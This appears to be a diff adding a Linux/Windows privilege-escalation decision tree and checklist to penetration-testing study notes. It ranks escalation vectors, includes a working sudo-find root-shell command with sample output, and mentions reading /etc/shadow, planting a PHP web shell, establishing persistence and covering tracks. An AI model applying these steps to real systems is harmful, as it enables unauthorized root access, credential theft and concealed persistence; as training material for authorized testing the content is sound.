@@ -36,6 +36,320 @@ Converting low-privilege user access → High-privilege user access
 
 ---
 
+# PRIVILEGE ESCALATION DECISION TREE & WORKFLOW
+
+## The PrivEsc Process: Step-by-Step Flowchart
+
+```
+START: You have shell access (user/www-data)
+│
+├─── QUESTION 1: Are you already root?
+│    ├─ YES → Done! Skip to post-exploitation
+│    └─ NO → Continue to Question 2
+│
+├─── QUESTION 2: Can you read /etc/passwd?
+│    ├─ YES → Check for password hashes, usernames
+│    └─ NO → Continue to Question 3
+│
+├─── QUESTION 3: Run enumeration
+│    ├─ Quick check (manual): id, whoami, sudo -l
+│    ├─ Full check (script): LinPEAS/winPEAS
+│    └─ Create detailed findings list
+│
+├─── QUESTION 4: Check for quick wins (fastest vectors first)
+│    │
+│    ├─ VECTOR A: Sudo NOPASSWD?
+│    │  ├─ YES → Check GTFOBins → Exploit immediately ✓✓✓
+│    │  └─ NO → Continue to B
+│    │
+│    ├─ VECTOR B: Exposed credentials?
+│    │  ├─ YES → Try password reuse on root/other users ✓✓✓
+│    │  └─ NO → Continue to C
+│    │
+│    ├─ VECTOR C: SSH keys readable?
+│    │  ├─ YES → Copy /root/.ssh/id_rsa → SSH login ✓✓
+│    │  └─ NO → Continue to D
+│    │
+│    ├─ VECTOR D: Weak file permissions?
+│    │  ├─ YES (e.g., /etc/shadow readable)
+│    │  │   └─ Crack hashes → Login as root ✓
+│    │  └─ NO → Continue to E
+│    │
+│    └─ VECTOR E: None of the quick wins?
+│       └─ Continue to Question 5
+│
+├─── QUESTION 5: Check for medium-effort vectors
+│    │
+│    ├─ VECTOR F: SUID/SGID binaries exploitable?
+│    │  ├─ YES → Analyze & exploit ✓
+│    │  └─ NO → Continue to G
+│    │
+│    ├─ VECTOR G: Cron jobs writable/modifiable?
+│    │  ├─ YES → Add malicious script → Wait for execution ✓
+│    │  └─ NO → Continue to H
+│    │
+│    ├─ VECTOR H: Scheduled tasks (Windows) exploitable?
+│    │  ├─ YES → Create/modify task → Wait for execution ✓
+│    │  └─ NO → Continue to I
+│    │
+│    └─ VECTOR I: None of the medium vectors?
+│       └─ Continue to Question 6
+│
+├─── QUESTION 6: Check for harder vectors
+│    │
+│    ├─ VECTOR J: Old kernel with known exploits?
+│    │  ├─ YES → Download exploit → Test in lab → Run carefully ✓
+│    │  └─ NO → Continue to K
+│    │
+│    ├─ VECTOR K: Old software with known CVEs?
+│    │  ├─ YES → Find exploit → Compile → Run ✓
+│    │  └─ NO → Continue to L
+│    │
+│    └─ VECTOR L: Custom/unusual binaries exploitable?
+│       ├─ YES → Analyze → Exploit ✓
+│       └─ NO → Continue to Question 7
+│
+├─── QUESTION 7: Check for environment-specific vectors
+│    │
+│    ├─ VECTOR M: Service running as root?
+│    │  ├─ YES → Can you interact with it? → Exploit it?
+│    │  └─ NO → Continue to N
+│    │
+│    ├─ VECTOR N: Library hijacking possible?
+│    │  ├─ YES → Create malicious library → LD_PRELOAD exploit
+│    │  └─ NO → Continue to O
+│    │
+│    └─ VECTOR O: Race condition exploitable?
+│       ├─ YES → Write exploit
+│       └─ NO → Continue to Question 8
+│
+├─── QUESTION 8: Are you stuck?
+│    │
+│    ├─ YES → Review findings more carefully
+│    │  ├─ Re-run enumeration with different approach
+│    │  ├─ Look for subtle clues (misconfigurations, etc.)
+│    │  ├─ Try less common vectors
+│    │  └─ Research the OS/software for known issues
+│    │
+│    └─ NO → You found it!
+│       └─ Proceed to exploitation
+│
+└─── SUCCESS: Root access achieved ✓
+     └─ Establish persistence
+     └─ Cover tracks (if needed)
+     └─ Document findings
+```
+
+---
+
+## Quick Decision Matrix: Which Vector First?
+
+**Priority Order (Fastest → Slowest):**
+
+| Priority | Vector | Time | Success % | Noise | Go First? |
+|----------|--------|------|-----------|-------|-----------|
+| 🔥 **1st** | **Sudo NOPASSWD** | 2 min | 95% | Silent | YES |
+| 🔥 **2nd** | **Exposed Credentials** | 5 min | 90% | Silent | YES |
+| 🔥 **3rd** | **SSH Keys** | 5 min | 85% | Silent | YES |
+| ⚡ **4th** | **Weak Permissions** | 10 min | 80% | Silent | YES |
+| ⚡ **5th** | **SUID Binaries** | 20 min | 70% | Medium | YES |
+| ⏱️ **6th** | **Cron Jobs** | 5-60 min | 85% | Medium | YES |
+| 🐌 **7th** | **Kernel Exploit** | 30 min | 60% | LOUD | Last Resort |
+| 🐌 **8th** | **Software Exploit** | 30 min | 65% | LOUD | Last Resort |
+
+---
+
+## Workflow: Real-World PrivEsc Checklist
+
+### Phase 1: Initial Reconnaissance (5 minutes)
+
+```bash
+# Step 1: Check if already root
+$ id
+uid=33(www-data) gid=33(www-data)  # Not root yet
+
+# Step 2: Quick sudo check
+$ sudo -l
+[sudo] password for www-data: (no password needed!)
+(root) NOPASSWD: /usr/bin/find
+
+# FOUND IT! Move to Phase 2
+```
+
+### Phase 2: Quick Win Exploitation (2-10 minutes)
+
+```bash
+# If sudo NOPASSWD found:
+$ sudo -l
+(root) NOPASSWD: /usr/bin/find
+
+# Check GTFOBins for find
+# gtfobins.github.io/find → Sudo section
+# Copy command: sudo find / -exec /bin/sh \; -quit
+
+# Execute:
+$ sudo find / -exec /bin/sh \; -quit
+root@target:~# id
+uid=0(root)  # SUCCESS!
+```
+
+### Phase 3: If Quick Wins Failed (20-60 minutes)
+
+```bash
+# Run full enumeration
+$ ./linpeas.sh > output.txt
+
+# Check each section:
+# 1. User permissions
+# 2. File permissions
+# 3. Cron jobs
+# 4. Installed software
+# 5. Running processes
+# 6. Kernel version
+
+# Identify vulnerability
+# Find exploit
+# Test locally
+# Execute on target
+```
+
+### Phase 4: Verify Success
+
+```bash
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@target:~# whoami
+root
+
+root@target:~# hostname
+target
+```
+
+---
+
+## Decision Logic by Scenario
+
+### Scenario 1: You Got Shell via RCE (No Password)
+
+```
+START
+├─ Can run commands? YES
+├─ Check sudo -l? (no password needed)
+│  ├─ NOPASSWD found? → GTFOBins → Win!
+│  └─ No NOPASSWD? → Continue
+├─ Check for credentials
+│  ├─ Found? → Try password reuse → Win!
+│  └─ Not found? → Continue
+└─ Run LinPEAS → Find other vectors
+```
+
+### Scenario 2: You Have Valid User Credentials
+
+```
+START
+├─ Try sudo -l (you have password)
+│  ├─ Any interesting sudo commands? → Exploit
+│  └─ Nothing? → Continue
+├─ Check for SSH keys in home dir
+│  ├─ Found? → Use to login as root
+│  └─ Not found? → Continue
+├─ Check file permissions (readable files)
+│  ├─ /etc/shadow readable? → Crack hashes
+│  └─ Not readable? → Continue
+└─ Run LinPEAS → Detailed analysis
+```
+
+### Scenario 3: Limited Shell (Can't Run Commands)
+
+```
+START
+├─ Check if it's web shell
+├─ Check what commands are allowed
+├─ If file read available:
+│  ├─ Read /etc/passwd → Get hashes
+│  ├─ Read /etc/shadow (if readable)
+│  └─ Read config files → Find credentials
+├─ If file write available:
+│  ├─ Write PHP shell to webroot
+│  └─ Convert to reverse shell
+└─ Escalate from upgraded shell
+```
+
+---
+
+## Key Principles to Remember
+
+### Principle 1: Always Check Sudo First
+```
+sudo -l is the FASTEST PrivEsc vector
+Takes 2 seconds to check
+Often leads to instant root
+Do this FIRST every time!
+```
+
+### Principle 2: Credentials Are Your Friend
+```
+Exposed credentials = Often easiest path
+Database password = User password = Root password
+Check config files FIRST
+Look for password reuse
+```
+
+### Principle 3: Lazy Admin = Your Advantage
+```
+Unpatched systems = Kernel exploits available
+Old software = Known CVEs exist
+Misconfigurations = Easy to exploit
+Weak permissions = Your goldmine
+```
+
+### Principle 4: Persistence Over Speed
+```
+SSH keys > sudo access
+Cron jobs > reverse shell
+Permanent access > temporary access
+Plan for the long game
+```
+
+### Principle 5: Know When to Stop
+```
+Try quick wins (5-10 minutes)
+Try medium vectors (20-30 minutes)
+Run enumeration script (10 minutes)
+Analyze results (30+ minutes)
+If stuck → Ask for hints or try different approach
+```
+
+---
+
+## How to Use This Decision Tree
+
+**In Real Time:**
+
+1. **Gain initial access** → You have shell
+2. **Open this decision tree** → Reference it
+3. **Follow the questions** → Go down the tree
+4. **Check each vector** → In priority order
+5. **Exploit the first working vector** → Root achieved!
+
+**Example Walkthrough:**
+
+```
+You: "I have shell as www-data"
+Tree: Q1: Are you root? NO
+You: "sudo -l"
+Tree: Q4A: Found NOPASSWD?
+You: "YES! /usr/bin/find"
+Tree: "Go to GTFOBins, exploit immediately"
+You: "sudo find / -exec /bin/sh \; -quit"
+Result: "Root shell! ✓"
+```
+
+---
+
+## Notes
+
 # PART 1: PRIVILEGE ESCALATION FUNDAMENTALS
 
 ## The Problem: Limited Access
